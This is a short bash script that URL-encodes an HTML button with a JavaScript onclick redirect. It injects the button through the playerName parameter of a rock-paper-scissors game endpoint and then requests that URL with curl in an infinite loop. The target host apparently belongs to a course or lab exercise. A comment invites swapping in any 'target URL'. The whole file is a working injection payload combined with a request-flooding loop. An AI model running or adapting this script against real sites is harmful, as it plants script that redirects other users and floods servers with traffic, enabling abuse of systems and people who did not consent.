#!/bin/bash

# Encoded button tag with JavaScript
encoded_button_tag="%3Cbutton%20onclick%3D%22window.location.href%20%3D%20'https%3A%2F%2Fstone.sifs0005.infs.ch%2F91912126-58d8-4382-a77e-05621539c7f1'%3B%22%3EClick%20Me%3C%2Fbutton%3E"

# Replace this URL with your target URL
URL="https://stone.sifs0005.infs.ch/play?playerName=$encoded_button_tag&playerHand=Rock&mode=spock"

while true; do
    curl -s "$URL" > /dev/null
done
